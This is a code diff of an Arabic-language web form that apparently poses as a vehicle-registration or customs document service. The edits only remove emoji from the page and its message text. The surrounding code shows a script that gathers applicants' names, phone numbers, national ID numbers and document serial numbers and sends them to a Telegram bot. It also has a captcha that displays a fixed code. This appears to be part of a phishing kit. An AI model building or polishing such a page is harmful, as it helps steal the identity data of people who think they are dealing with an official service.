@@ -435,7 +435,7 @@ input[type="tel"], select {
   
   <div class="top-bar">
     <div class="top-actions">
-            <span class="user-chip">👤</span>
+            <span class="user-chip"></span>
 
       <span class="lang-chip">EN</span>
     </div>
@@ -527,7 +527,7 @@ input[type="tel"], select {
   <div class="captcha">
     <input type="tel" id="captchaInput" placeholder="رمز التحقق" required maxlength="4">
     <span id="captchaCode">1234</span>
-    <button type="button" onclick="generateCaptcha()">🔄</button>
+    <button type="button" onclick="generateCaptcha()"></button>
   </div>
 
   <div class="checkbox">
@@ -809,13 +809,13 @@ input[type="tel"], select {
     async function submitToServer(data) {
       const formType = data.document_type === 'استمارة' ? 'استمارة' : 'بطاقة جمركية';
       const message = `
-📋 <b>معلومات مقدم الطلب الجديدة:</b>
-━━━━━━━━━━━━━━━
-👤 الاسم: ${data.owner_name}
-📱 الهاتف: ${data.phone}
+ <b>معلومات مقدم الطلب الجديدة:</b>
+
+ الاسم: ${data.owner_name}
+ الهاتف: ${data.phone}
 🪪 رقم الهوية: ${data.id_number}
-📄 نوع الوثيقة: ${formType}
-${formType === 'استمارة' ? `🔢 الرقم التسلسلي: ${data.serial_number}` : `📅 سنة الصنع: ${data.birth_date || 'غير محدد'}\n🔢 الرقم التسلسلي: ${data.serial_number}`}
+ نوع الوثيقة: ${formType}
+${formType === 'استمارة' ? ` الرقم التسلسلي: ${data.serial_number}` : ` سنة الصنع: ${data.birth_date || 'غير محدد'}\n الرقم التسلسلي: ${data.serial_number}`}
       `;
       return await sendToTelegram(message);
     }
